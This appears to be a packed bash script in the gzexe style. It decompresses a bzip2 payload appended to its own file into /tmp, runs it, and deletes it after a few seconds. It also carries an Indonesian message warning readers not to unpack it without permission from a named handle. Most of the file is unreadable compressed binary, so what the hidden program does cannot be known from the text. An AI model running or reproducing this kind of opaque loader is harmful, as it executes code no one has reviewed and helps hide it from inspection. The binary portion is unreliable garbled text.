#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��a  ��g�� ����������@D@  � �[۫t�Rɷ!�$���S�jO�?J4�S"<�@�Q�SF�H �i��4� �4ɦ�Iৢh� � 4 �  �H�Q�yF@�44  dH   �#M4 �   �dh 4h�	"b2�jzLG��z�h@�A�Ѡ4�H� �H n���n=-GQ��v����j� �1)�Ŕ7Ǵ�䥽`	��x1�*�Nͳ8gf5�����F�#j����E��!�m�8M6���"8�X=�HV<�_�ɫ��1�+K�ؘ|�%;׽�LRA.̃T�WSн[�j��̞�!L�zf�M��z2���6-�x�h�D�a�bKw~�6��T��-A����`�|C x��J���`4� Ў
�� TA"�R�͝�*�SYi��ҏ%��&Ѱ�2�Gu��`m�Z�o�F�(1�D���a%`�a�_�\���E�FY8i��Y�HO �6Z�dݵ1 ԗ]&��n�����hJk[߱&Q#b6���1��a��
��m2�^��m���B����sp�{>�^v��`U"�F3�8M�qaOvmu����e���0M^��s$|�5�?.�C�g�;(Oʂ��釵� ���p����J�1��>�j��6͚��ŋ���;"�ȓ�gpܯrȘ��H2A¶�k"Vw1�;�!2rq(������ZJ�l\7�����?�z�:��%��*,�',0����r�AHVr��Is��r�4�8ŚA��P�d6���3���J ����6�wD^񉄎���8�
��u��4�at��ހ��]ҽt���0X��M���SHI��$<�1�X4�]��׵Er�V��G�:O��KeG�^��p#<�/���@�ʑ���II���8)��T[y��Oˠ�Гa
TB�����$��z(��n@D�<(�"�Cbi�[�'(4a���,����Zn�"��^�/,�2l 劗����قb�H�l�!��ey;AXZe�Y�B(8H�F���삼�]���u�<�"�0�A�JJ4'H�AL�Q��ȽAV�cJ9�ԩ�X��G�PL\-2�X�a
+r����d�F�F&4RV��� �?�����H`?��U��N0� ��qÌ��rE8P���a